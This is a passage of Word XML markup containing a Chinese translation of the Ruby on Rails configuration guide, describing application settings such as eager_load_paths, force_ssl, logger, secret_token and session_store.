          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.threadsafe!</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为 false.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="636CBFFB" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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config.eager_load_paths</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受一个路径数组。 如果有开启类缓存，那么 Rails 会在启动时即时加载(eager load)这些路径里的内容. 默认是应用程序 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录下的所有目录.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E0DE8A2" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="124"/>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config.encoding</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置整个应用程序的编码. 默认是 UTF-8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56A270A2" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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config.exceptions_app</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置异常处理应用程序. 这个应用程序在异常发生时会被ShowException中间件调用. 默认是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionDispatch::PublicExceptions.new(Rails.pulic_path)</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C7D244" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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config.file_watcher</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 被用于监测文件系统里文件更新的类. 在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.reload_classes_only_on_change</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 true 的时候有效. 必须符合 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveSupport::FileUpdateChecker</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> API.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CDA4541" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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config.file_parameters</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 用于过滤掉不想被显示在日志里的参数, 比如密码和信用卡号码.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9FC48D" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="128"/>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config.force_ssl</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 强制所有的请求使用</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionDispath::SSL</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中间件走 HTTPS 协议.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78442B76" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="129"/>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config.log_level</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 定义 Rails 日志的冗长程度. 这个选项默认为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:debug</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并对所有模式有效,除了生产模式. 生产模式默认为</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:info</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A4450B1" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="130"/>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config.log_tags</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受一组方法, 这些方法会被 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象使用. 这使标记调试信息日志行更容易, 像子域名和请求标识(id) — 在调试多用户应用程序产品时都很有用.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D875D5" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13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config.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受一个日志类, 这个类遵循 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Log4r</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者 Ruby 默认的 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类的接口. 默认是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveSupport::BufferedLogger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的对象, 在生产模式是关闭的.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602D5CEB" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13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config.middleware</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 让你配置应用程序的中间件. 这在下面的 </w:t>
      </w:r>
      <w:hyperlink r:id="rId873" w:anchor="configuring-middleware" w:history="1">
        <w:r w:rsidRPr="005A4264">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Configuring Middleware</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 章节有更深入的概述</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47529CD4" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13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config.preload_frameworks</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 使应用程序在启动时是否预加载所有的框架. 通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.threadsafe!</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 开启. 默认是 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, 所以是关闭的.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47575BB7" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="134"/>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config.preload_classes_only_on_change</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 当被监测文件发生改变时,类是否能被重新加载.该值默认设置为 true, 所以会默认监测所有在自动加载路径里的内容. 如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.cache_classes</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 true, 这个选项会被忽略.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D664821" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13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config.secret_token</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 用于指定一个键, 这让应用程序会话对比已有的密钥来进行验证以防止干扰.应用程序会从 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/initializers/secret_token.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件里获取被初始化为一个随机值的 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.secret_token</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57EA1339" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13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config.serve_static_assets</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 配置 Rails 自己处理静态资源. 默认为 true, 但在生产环境是被关闭的,因为有运行应用程序的服务器软件(e.g. Nginx 或 Apache)去处理静态资源. 将其设置为与默认值相反的 true, 则生产模式下会使用 WEBrick 运行(完全不建议!)或者测试你的应用. 不然你将不能使用页面缓存,而且对位于公共目录下文件的请求都会被转给 Rails 应用.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49F047A6" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13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config.session_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 通常在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/initializers/session_store.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里设置并指定使用什么类去存储会话. 可能的值会是默认的</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:cookie_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:mem_cache_store</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, 或 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:disabled</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. 最后一个告诉 Rails 不处理会话. 也可以指定自定义会话存储:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4440"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="7E6CB77A" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="21F99242" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2051804738"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.session_store :my_custom_store</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2BC7CACB"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这个自定义存储必须被定义为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionDispatch::Session::MyCustomStore</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. 根据这些 symbols, 它们也可以是实现了一些 API 的对象, 如 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveRecord::SessionStore</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, 这种情况就可以不指定命名域.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ABB90CF" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="138"/>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config.threadsafe!</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 激活 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
